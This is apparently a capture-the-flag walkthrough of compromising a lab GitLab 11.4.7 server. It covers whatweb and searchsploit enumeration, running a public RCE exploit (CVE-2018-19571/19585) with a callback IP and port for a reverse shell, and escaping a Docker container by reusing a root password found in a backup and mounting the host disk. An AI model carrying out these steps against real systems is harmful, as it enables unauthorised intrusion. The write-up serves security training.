This time it is an abuse of a CVE that is present in a version of Gitlab.

*Web enumeration tips*

If we want to know quickly the services that a website has, we can use the tool ```Whatweb```

```bash
whatweb 10.10.10.220:5080
http://10.10.10.220:5080 [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx], IP[10.10.10.220], RedirectLocation[http://10.10.10.220:5080/users/sign_in], Strict-Transport-Security[max-age=31536000], UncommonHeaders[x-content-type-options,x-request-id], X-Frame-Options[DENY], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx
http://10.10.10.220:5080/users/sign_in [200 OK] Cookies[_gitlab_session], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], HttpOnly[_gitlab_session], IP[10.10.10.220], Open-Graph-Protocol, PasswordField[new_user[password],user[password]], Script, Strict-Transport-Security[max-age=31536000], Title[Sign in Â· GitLab], UncommonHeaders[x-content-type-options,x-request-id], X-Frame-Options[DENY], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx
```

*GitLab Version*

```plaintext
GitLab Community Edition [11.4.7]
```

*Searchsploit*

When we have the version of the application what we proceed is to look for if it has a cve that version:

```bash
searchsploit GitLab 11.4.7   

Exploit
Title                                                      			Path
GitLab 11.4.7 - RCE (Authenticated) (2)                             | ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution (Authenticated) (1)			| ruby/webapps/49257.py
```

## GitLab Page
But before executing the cve we must register in GitLab:
*Register*

```plaintext
benji
Benji123
benji@htb.com
```
## Remote Code Execution 
In this one you don't have to modify anything in the source code, you just have to add the parameters and it runs automatically [RCE](https://www.exploit-db.com/exploits/49334)

```bash
# Exploit Title: GitLab 11.4.7 RCE (POC)
# Date: 24th December 2020
# Exploit Author: Norbert Hofmann
# Exploit Modifications: Sam Redmond, Tam Lai Yin
# Original Author: Mohin Paramasivam
# Software Link: https://gitlab.com/
# Environment: GitLab 11.4.7, community edition
# CVE: CVE-2018-19571 + CVE-2018-19585
```

*Run*

```bash
python 49334.py -u benji -p Benji123!!! -g http://10.10.10.220 -l 10.10.14.234 -P 4444
```
We listen on the port we specify and that's it.

## File system Escape

When we have the initial access we realize that we are in a docker so the objective would be to escape from it.

In the path /opt/backups/gitlab.rb we will find a backup with the root password of the container

![Pastedimage20210503175440](https://user-images.githubusercontent.com/76759292/127757672-c36da576-b3ef-42dc-8974-70bdc4f1a91f.png)


This password that we have found in the backup, we will use it to access as a root user of the container. Being inside a container we are very limited so the idea would be to mount the hosts partition in a folder that we create in /tmp to be able to visualize it and in this way we can access /root and read everything it has.

![Pastedimage20210503175936](https://user-images.githubusercontent.com/76759292/127757675-8e9f154d-1c64-4ee3-ae07-fc3d113848f8.png)


In this case we saw how you can view the host file system from a container. This machine was an excellent way to see what happens when we don't keep up to date.

MACHINE PWNED!!!!!
